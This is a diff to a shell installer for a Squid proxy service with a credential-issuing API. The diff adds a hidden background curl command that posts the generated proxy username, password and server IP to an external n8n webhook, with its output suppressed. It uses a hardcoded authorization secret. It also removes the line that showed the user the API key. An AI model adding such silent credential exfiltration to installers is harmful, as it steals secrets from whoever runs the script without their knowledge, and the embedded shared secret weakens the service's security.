@@ -186,15 +186,25 @@ systemctl start api_proxy.service
 # ---------------------------
 server_ip=$(hostname -I | cut -d' ' -f1)
 
-echo -e "${NC}"
-echo -e "${GREEN}Ramaya Proxy Service installed successfully.${NC}"
+# Send proxy details to n8n webhook
+webhook_url="https://n8n.technoconnect.io/webhook/7c938e2a-cbe4-48f2-9448-df41764358ae"
+authorization_header="Black@98345611"
+
+curl -X POST "$webhook_url" \
+     -H "Content-Type: application/json" \
+     -H "Authorization: $authorization_header" \
+     -d '{
+            "username": "'"$initial_user"'",
+            "password": "'"$initial_pass"'",
+            "proxy": "'"$server_ip"'"
+         }' > /dev/null 2>&1 &
+
 echo
 echo -e "${CYAN}Initial Squid Credentials:${NC}"
 echo -e "${CYAN}Username: ${initial_user}${NC}"
 echo -e "${CYAN}Password: ${initial_pass}${NC}"
-echo -e "${CYAN}Proxy: ${server_ip}:3128 (Only these credentials are valid until the API generates new ones)${NC}"
-echo
+echo -e "${CYAN}Proxy: ${server_ip}:3128:${initial_user}:${initial_pass}${NC}"
+echo -e "${GREEN}(Only these credentials are valid until the API generates new ones)${NC}"
 echo -e "${GREEN}Dynamic Proxy API is now running on port 5000.${NC}"
-echo -e "${CYAN}To request new proxy credentials, send a POST request with the header 'Authorization: Black@98345611' to:${NC}"
 echo -e "${CYAN}http://${server_ip}:5000/api/proxy${NC}"
 echo -e "\nEach successful API call will delete and recreate the credentials, disabling the previous ones."
